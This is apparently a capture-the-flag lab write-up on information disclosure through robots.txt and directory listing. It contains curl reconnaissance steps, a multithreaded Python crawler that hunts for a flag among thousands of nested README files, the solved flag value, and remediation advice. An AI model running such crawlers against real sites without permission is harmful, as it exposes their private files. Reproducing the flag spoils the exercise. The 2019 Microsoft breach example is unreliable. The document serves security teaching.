# Hidden Directory - Robots.txt & Directory Crawl

## Breach Type
**Information Disclosure / Security Misconfiguration** — OWASP Top 10: A05:2021 Security Misconfiguration

## What is this Vulnerability?
**Information Disclosure via Security Misconfiguration** is a vulnerability where sensitive files, directories, or data are accidentally exposed to the public due to improper server configuration.

In this case, two misconfigurations are chained together:
1. **robots.txt exposure**: `robots.txt` is meant to tell search engines what NOT to index. But attackers read it too — it's essentially a **map of hidden directories**. Listing `/.hidden` in robots.txt is like putting a "SECRET ROOM" sign on a door.
2. **Directory listing enabled**: The web server has directory listing turned on (`Options +Indexes` in Apache), so browsing to `/.hidden/` shows all subdirectories and files. Without directory listing, you'd get a 403 Forbidden.

The `.hidden` directory contains thousands of nested subdirectories with decoy README files (in French), and the real flag is buried deep. This is "security through obscurity" — which is NOT real security.

### Why is it dangerous?
- **Sensitive data exposure**: Attackers can find backup files, credentials, configuration files, database dumps
- **Attack surface expansion**: Hidden directories may contain admin panels, debug interfaces, or test endpoints
- **Automated exploitation**: Scripts can crawl directory listings in minutes, no matter how deeply files are nested
- **Information for further attacks**: Exposed files reveal application structure, technology stack, and internal paths

### Real-world impact
Directory listing has led to breaches at numerous organizations. In 2019, a directory listing misconfiguration exposed 250M Microsoft customer support records. Exposed `.git` directories on production servers have leaked source code of major companies.

## Where
- URL: `http://<IP>/robots.txt` → Reveals hidden paths
- URL: `http://<IP>/.hidden/` → Contains deeply nested directories with flag

## How I Found It
1. Checked `robots.txt` (standard reconnaissance step):
   ```
   User-agent: *
   Disallow: /whatever
   Disallow: /.hidden
   ```
2. The `.hidden` directory contains 26 subdirectories, each containing more subdirectories (3 levels deep).
3. Each directory contains a `README` file. Most contain decoy messages in French.
4. Wrote a crawler script to recursively check all README files for the actual flag.

## Step-by-Step Exploitation

### Step 1: Check robots.txt
```bash
curl http://<IP>/robots.txt
```
Result: Reveals `/whatever` and `/.hidden` paths.

### Step 2: Explore .hidden Directory
```bash
curl http://<IP>/.hidden/
```
Result: 26 subdirectories + a README saying "Tu veux de l'aide ? Moi aussi !" (decoy).

### Step 3: Crawl Recursively
The directories are 3 levels deep with ~26 dirs at each level (26 × 26 × 26 = 17,576 possible paths).
Most README files contain French decoy messages like:
- "Tu veux de l'aide ? Moi aussi !"
- "Demande à ton voisin de droite"
- "Non ce n'est toujours pas bon..."
- "Toujours pas ici"

### Step 4: Use a Script to Find the Real Flag

Save the script below as `crawl.py` and run it with:

```bash
python3 crawl.py
```

```python
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import threading
import time
import os
import shutil
import sys

BASE_URL = "http://localhost:8080/.hidden/"
MAX_THREADS = 20

session = requests.Session()
queue = Queue()
visited = set()
found_flag = threading.Event()

counter = 0
counter_lock = threading.Lock()
start_time = time.time()

queue.put(BASE_URL)


def worker():
    while not queue.empty() and not found_flag.is_set():
        url = queue.get()

        if url in visited:
            queue.task_done()
            continue

        visited.add(url)

        try:
            r = session.get(url, timeout=5)
            soup = BeautifulSoup(r.text, "html.parser")

            for link in soup.find_all("a"):
                href = link.get("href")

                if not href or href == "../":
                    continue

                full_url = urljoin(url, href)

                if href.endswith("/"):
                    queue.put(full_url)

                elif href == "README":
                    check_readme(full_url)

        except Exception:
            pass

        queue.task_done()


def check_readme(url):
    global counter

    if found_flag.is_set():
        return

    try:
        r = session.get(url, timeout=5)
        content = r.text

        with counter_lock:
            counter += 1
            cols = shutil.get_terminal_size(fallback=(120, 24)).columns
            line = f"[CHECKING {counter}] {url}"
            # Truncate to terminal width so the line never wraps (wrapping breaks \r)
            display = line[:cols - 1].ljust(cols - 1)
            sys.stdout.write(f"\r{display}")
            sys.stdout.flush()

        if "flag" in content.lower():
            elapsed = time.time() - start_time
            print(f"\n\n====== FLAG FOUND ======")
            print(f"Location: {url}")
            print(f"Time elapsed: {elapsed:.1f}s\n")
            print(content.strip())
            print("========================")

            found_flag.set()
            os._exit(0)

    except Exception:
        pass


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for _ in range(MAX_THREADS):
            executor.submit(worker)

    queue.join()
```

Key features:
- **20 threads** crawl all ~17,576 directories in parallel
- **Single updating line** — `[CHECKING N] <url>` overwrites itself so the terminal stays clean (truncated to terminal width to prevent wrapping)
- **Instant clean exit** when the flag is found (no Ctrl+C needed)
- **Elapsed time** shown alongside the flag

Example output when the flag is found:
```
[CHECKING 15795] http://localhost:8080/.hidden/.../README

====== FLAG FOUND ======
Location: http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
Time elapsed: 112.1s

Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
========================
```

### Step 5: Flag Found
The flag is located at:
```
/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
```
Content: `Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`

## Flag
```
d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

## How to Test Manually
1. Open `http://<IP>/robots.txt` → See the hidden paths
2. Browse to `http://<IP>/.hidden/` → See the directory listing
3. Run the Python crawler script above (it takes a few minutes to scan all directories)
4. Or manually navigate: `/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README`

## How to Fix
- **Don't list sensitive paths in robots.txt** — it's publicly accessible and often the first place attackers look
- **Disable directory listing** in the web server configuration (`Options -Indexes` in Apache)
- Don't store sensitive data in publicly accessible directories
- Use proper **authentication** for sensitive content
- Remove unnecessary files and directories from the web root

## OWASP Reference
- [Information Disclosure](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/)
- [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
